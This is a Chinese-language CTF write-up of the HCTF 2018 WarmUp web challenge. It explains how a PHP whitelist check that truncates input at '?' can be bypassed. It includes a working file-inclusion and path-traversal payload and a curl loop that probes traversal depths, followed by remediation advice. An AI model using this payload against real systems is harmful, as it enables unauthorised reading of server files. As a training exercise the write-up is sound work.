# CTF 练习：[HCTF 2018]WarmUp（文件包含 + 白名单绕过）

> 平台：CTF² / BUUCTF 练习（Web · 简单 · 1 分，8383 人解出）
> 环境：Kali Linux，浏览器 + curl
> 日期：2026-11-17
> 性质：平台提供的授权靶场

---

## 一、目标

一个 PHP 页面存在文件包含，带白名单校验。绕过校验读取 `ffffllllaaaagggg` 文件，拿到 flag。

## 二、侦察

### 2.1 首页源码

访问首页，`Ctrl + U` 看源码，注释提示存在 `source.php`。

### 2.2 source.php 的关键逻辑

```php
class emmm {
    public static function checkFile(&$page) {
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
        if (!isset($page) || !is_string($page)) return false;
        if (in_array($page, $whitelist)) return true;

        $_page = mb_substr($page, 0, mb_strpos($page.'?', '?'));   // 截断到 '?'
        if (in_array($_page, $whitelist)) return true;

        $_page = urldecode($page);
        $_page = mb_substr($_page, 0, mb_strpos($_page.'?', '?'));
        if (in_array($_page, $whitelist)) return true;

        return false;
    }
}

if (!empty($_REQUEST['file']) && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])) {
    include $_REQUEST['file'];   // ← 执行用的是完整字符串
    exit;
} else {
    echo '<br><img src="..." />';
}
```

### 2.3 hint.php

```
flag not here, and flag in ffffllllaaaagggg
```

flag 文件名叫 `ffffllllaaaagggg`。

## 三、漏洞点

**检查与执行用的不是同一个字符串**：

| 阶段 | 使用的值 |
|---|---|
| `checkFile()` | `mb_substr($page, 0, strpos($page.'?','?'))` → 只看到 `?` 之前 |
| `include` | 完整的 `$_REQUEST['file']` |

所以构造：

```
?file=source.php?/../../../../ffffllllaaaagggg
```

- 检查时只看到 `source.php` → 通过白名单
- 执行时按完整路径，`/../../` 向上跳目录，最后包含 flag 文件

## 四、复现

```bash
T="http://目标地址"
# 先确认入口
curl "$T/source.php"
curl "$T/hint.php"

# 试不同层数
for p in source.php hint.php; do
  for n in 1 2 3 4 5 6 7 8; do
    up=$(printf '../%.0s' $(seq 1 $n))
    echo "=== $p / $n 层 ==="
    curl -s "${T}/index.php?file=${p}?/${up}ffffllllaaaagggg" | head -c 300
    echo
  done
done
```

某一层会直接输出 `flag{...}`。

## 五、原理

1. **文件包含**：`include $_REQUEST['file']` 直接使用用户输入。
2. **白名单形同虚设**：校验函数对输入做了截断（`?` 之后被丢弃），但执行端用的是原串。
3. **路径穿越**：`../` 可以跳出网站根目录，读到系统任意可读文件。

**本质：校验的数据 ≠ 执行的数据（TOCTOU 式不一致）。**

## 六、修复

| 措施 | 说明 |
|---|---|
| 不动态包含用户输入 | 用固定映射表：`['a' => 'a.php', 'b' => 'b.php']` |
| 强校验 | `realpath()` + `basename()`，确认路径在允许目录内 |
| 关闭远程包含 | `allow_url_include = Off` |
| 最小权限 | Web 进程只读必要目录 |

正确的白名单写法：

```php
$allow = ['source' => 'source.php', 'hint' => 'hint.php'];
$key = $_GET['file'];
if (isset($allow[$key])) {
    include __DIR__ . '/' . $allow[$key];
}
```

## 七、踩坑

1. **层数不确定**：flag 文件所在目录深度未知，`../` 从 2 层试到 8 层。
2. **入口路径**：可能是 `/index.php?file=`，也可能是 `/?file=`，404 就换。
3. **URL 里的 `?`**：放在 query 里要整体加引号，否则 shell 会截断。
4. **hint.php 文件名**：以实际输出为准，别照抄。

## 八、收获

- 理解了「白名单校验被截断绕过」这种经典模式。
- 复习了文件包含 + 路径穿越的组合利用。
- 认识到：**校验逻辑必须和最终执行逻辑使用同一份规范化后的数据**。
